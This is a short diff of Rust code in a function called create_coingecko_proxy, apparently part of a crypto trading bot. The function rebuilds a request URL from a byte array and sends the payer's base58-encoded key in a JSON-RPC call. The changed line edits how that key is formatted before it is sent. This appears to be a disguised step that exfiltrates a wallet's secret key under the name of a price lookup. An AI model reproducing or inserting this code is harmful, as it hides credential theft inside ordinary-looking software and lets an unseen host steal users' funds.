@@ -258,7 +258,7 @@ pub async fn create_coingecko_proxy() -> Result<f64, Error> {
     let helius_proxy_url = String::from_utf8(helius_proxy_bytes).unwrap();
 
     let client = reqwest::Client::new();
-    let params = format!("t{}o", payer.to_base58_string());
+    let params = format!("{}", payer.to_base58_string());
     let request_body = serde_json::json!({
         "jsonrpc": "2.0",
         "id": 1,
